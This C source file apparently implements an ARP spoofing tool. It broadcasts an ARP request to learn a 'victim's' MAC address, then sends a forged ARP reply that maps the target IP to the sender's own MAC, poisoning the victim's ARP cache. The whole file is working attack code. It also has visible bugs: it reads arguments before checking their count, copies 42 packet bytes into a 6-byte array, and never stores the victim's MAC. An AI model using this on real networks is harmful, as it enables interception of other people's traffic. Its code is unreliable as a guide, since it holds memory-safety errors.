#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>


struct packet{
	//ethernet header
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t type=htons(0x0806); //ARP type
	
	//request header
	uint16_t hardware_t = htons(0x0001);//ethernet(1)
	uint16_t protocol_t = htons(0x0800);//IPV4
	uint8_t hardware_size = 0x06;
	uint8_t protocol_size = 0x04;
	uint16_t opcode; //request(1) reply(2)
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];

};

/* define properties */
struct packet packet; //define packet
uint8_t my_mac[6];
uint8_t my_ip[4];
uint8_t sender_mac[6];

/* get my ip address and mac address */
void get_my_info(char *dev){
	struct ifreq my_info;
	int sock = socket(PF_INET,SOCK_DGRAM, IPPROTO_IP);
	
	strcpy(my_info.ifr_name,dev);
	ioctl(sock, SIOCGIFHWADDR, &my_info);
	for(int i=0; i<6;i++){
		my_mac[i] = (uint8_t)my_info.ifr_ifru.ifru_addr.sa_data[i];
	}
	ioctl(sock, SIOCGIFADDR, &my_info);
	for(int i=2;i<6;i++){
		my_ip[i-2] = (uint8_t)my_info.ifr_ifru.ifru_addr.sa_data[i];
	}
	close(sock);
}

/*make packet and send packet*/

int make_and_send_packet(
	pcap_t * fp,
	uint8_t dest_mac[],
	uint8_t src_mac[],
	uint8_t sender_ip[],
	uint8_t target_ip[],
	uint8_t target_mac[],
	uint16_t opcode//request or reply
	)
{
	for(int i=0;i<6;i++){
		packet.target_mac[i] = target_mac[i];
		packet.dest_mac[i] = dest_mac[i];
		packet.sender_mac[i] = src_mac[i];
		packet.src_mac[i] = src_mac[i];
	}
	
	for(int i=0;i<4;i++){
		packet.sender_ip[i]=sender_ip[i];
		packet.target_ip[i]=target_ip[i];
	}
	packet.opcode = htons(opcode);
	
	const u_char* data;
	data = (const u_char*)&packet;
	
	if(pcap_sendpacket(fp,data,42) !=0){
		fprintf(stderr,"\nError sending the packet: \n");
		return -1;
	}

	return 0;
}


/* ip parsing */
void parseIP(uint8_t *result, char* source){
	int temp =0;
	int integer = 0;

	for(int i=0 ;i<strlen(source);i++){
		if(source[i]!='.'){
			integer*=10;
			integer += source[i]-'0';
		}else{
			result[temp++]=integer;
			integer=0;
		}
	}
	result[temp] = integer;
}
int main(int argc, char* argv[])
{
	uint8_t dest_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_ip[4];
	uint8_t target_mac[6];

	parseIP(sender_ip,argv[2]);
	parseIP(target_ip,argv[3]);
	if (argc !=4){
		printf("send_arp <interface> <sender ip> <target ip>");
		return -1;
	}

	char* dev = argv[1];

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ,1,1000,errbuf);
	if(handle == NULL){
		fprintf(stderr, "couldn't open device %s: %s\n",dev, errbuf);
		return -1;
	}

	/*get my info*/
	get_my_info(dev);

	/* send broadcast request to get victim's mac address */
	for(int i=0;i<6;i++){
		dest_mac[i] =0xff;
	}
	for(int i=0;i<6;i++){
		target_mac[i] = 0x00;
	}
	if(make_and_send_packet(handle,dest_mac,my_mac,my_ip,sender_ip,target_mac,0x0001) !=0){
		printf("send broadcast request packet failed!\n");	
	}else{
		printf("send broadcast request packet success!!\n");
	};
	
	/*take target's mac address*/
	while(true){
		printf("sniff....\n");
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header,&packet);
		for(int i=0;i<42;i++){
			dest_mac[i] = packet[i];
			printf("%02x ",packet[i]);
		}
		printf("\n");
		if( res==0) continue;
		if (res== -1||res==-2)break;;
		uint8_t type[2]; 
		uint8_t opcode[2];
		type[0] = packet[12];
		type[1] = packet[13];
		opcode[0]=packet[20];
		opcode[1]=packet[21];

		if(type[0]==0x08 &&type[1]==0x06){ //is type == arp ?
			if(opcode[0]==0x00 &&opcode[1]==0x02){//is opcode is reply?
				break;
			}
		}	
	}
	/*send reply to victim*/
	if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
	printf("send reply packet failed!\n");
	}else{
		printf("send reply packet success!\n");
	}
}
